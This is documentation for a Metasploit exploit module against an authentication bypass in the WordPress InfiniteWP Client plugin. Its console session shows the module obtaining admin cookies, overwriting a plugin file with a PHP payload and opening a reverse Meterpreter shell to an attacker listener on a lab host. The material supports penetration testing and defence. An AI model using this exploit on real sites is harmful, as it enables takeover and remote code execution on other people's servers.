## Vulnerable Application

### Description

This module exploits an authentication bypass in the WordPress
InfiniteWP Client plugin to log in as an administrator and execute
arbitrary PHP code by overwriting the file specified by `PLUGIN_FILE`.

The module will attempt to retrieve the original `PLUGIN_FILE` contents
and restore them after payload execution. If `VerifyContents` is set,
which is the default setting, the module will check to see if the
restored contents match the original.

Note that a valid administrator username is required for this module.

### Setup

1. Install WordPress
2. Download <https://downloads.wordpress.org/plugin/iwp-client.1.9.4.4.zip>
3. Follow <https://wordpress.org/plugins/iwp-client/#installation>

### Targets

```
Id  Name
--  ----
0   InfiniteWP Client < 1.9.4.5
```

## Verification Steps

Follow [Setup](#setup) and [Scenarios](#scenarios).

## Options

**USERNAME**

Set this to a known, valid administrator username. Authentication will
be bypassed for this user.

**PLUGIN_FILE**

Set this to a plugin file to insert the payload into, relative to the
plugins directory, which is normally `/wp-content/plugins`. The file
must exist and be writable by the web user. It will be overwritten and
later restored.

**VerifyContents**

Verify that the restored contents of `PLUGIN_FILE` match the original.
This is the default setting.

## Scenarios

### InfiniteWP Client 1.9.4.4

```
msf5 > use exploit/unix/webapp/wp_infinitewp_auth_bypass
msf5 exploit(unix/webapp/wp_infinitewp_auth_bypass) > show missing

Module options (exploit/unix/webapp/wp_infinitewp_auth_bypass):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)

msf5 exploit(unix/webapp/wp_infinitewp_auth_bypass) > set rhosts 127.0.0.1
rhosts => 127.0.0.1
msf5 exploit(unix/webapp/wp_infinitewp_auth_bypass) > set rport 8080
rport => 8080
msf5 exploit(unix/webapp/wp_infinitewp_auth_bypass) > set lhost 192.168.56.1
lhost => 192.168.56.1
msf5 exploit(unix/webapp/wp_infinitewp_auth_bypass) > run

[*] Started reverse TCP handler on 192.168.56.1:4444
[*] Found version 1.9.4.4 in the custom file
[*] Bypassing auth for admin at http://127.0.0.1:8080/
[+] Successfully obtained cookie for admin
[*] Cookie: wordpress_37d007a56d816107ce5b52c10342db37=admin%7C1581232705%7CF8scWg5ll4PTVNpRx9Ye4ACXAFiICxpezmukJrU5Izb%7C066e08465b4fcf95f8562a65d25338f7e09f18832c583d4f5960f7cb9ba0a0b8; wordpress_37d007a56d816107ce5b52c10342db37=admin%7C1581232705%7CF8scWg5ll4PTVNpRx9Ye4ACXAFiICxpezmukJrU5Izb%7C066e08465b4fcf95f8562a65d25338f7e09f18832c583d4f5960f7cb9ba0a0b8; wordpress_logged_in_37d007a56d816107ce5b52c10342db37=admin%7C1581232705%7CF8scWg5ll4PTVNpRx9Ye4ACXAFiICxpezmukJrU5Izb%7C33df9b73b0ea9ea85f521c28848f9118bb62862418ae306d2ff14732011e5681; wordpress_sec_37d007a56d816107ce5b52c10342db37=admin%7C1581232705%7CTzi0VghEMcaH7twJkibB54wx4OXJ1VwGwOvuwHl1zIR%7C3db5cc0c5d78db233519a12afb40d3b23d96c70ee956cad6f5a72c5a5d05e3aa; wordpress_sec_37d007a56d816107ce5b52c10342db37=admin%7C1581232705%7CTzi0VghEMcaH7twJkibB54wx4OXJ1VwGwOvuwHl1zIR%7C3db5cc0c5d78db233519a12afb40d3b23d96c70ee956cad6f5a72c5a5d05e3aa; wordpress_logged_in_37d007a56d816107ce5b52c10342db37=admin%7C1581232705%7CTzi0VghEMcaH7twJkibB54wx4OXJ1VwGwOvuwHl1zIR%7C004c44e308040800a0b986f233011ac1c7a5c05dcd1561db44bb2514b2fcc332;
[+] Successfully logged in as admin
[*] Retrieving original contents of /wp-content/plugins/index.php
[+] Successfully retrieved original contents of /wp-content/plugins/index.php
[*] Contents:
<?php
// Silence is golden.
[*] Overwriting /wp-content/plugins/index.php with payload
[*] Acquired a plugin edit nonce: ebb5a2b07f
[*] Edited plugin file index.php
[+] Successfully overwrote /wp-content/plugins/index.php with payload
[*] Requesting payload at /wp-content/plugins/index.php
[*] Restoring original contents of /wp-content/plugins/index.php
[*] Sending stage (38288 bytes) to 192.168.56.1
[*] Acquired a plugin edit nonce: ebb5a2b07f
[*] Edited plugin file index.php
[+] Current contents of /wp-content/plugins/index.php match original!
[*] Meterpreter session 1 opened (192.168.56.1:4444 -> 192.168.56.1:64787) at 2020-02-07 01:18:27 -0600

meterpreter > getuid
Server username: www-data (33)
meterpreter > sysinfo
Computer    : 2c991a571915
OS          : Linux 2c991a571915 4.19.76-linuxkit #1 SMP Thu Oct 17 19:31:58 UTC 2019 x86_64
Meterpreter : php/linux
meterpreter >
```
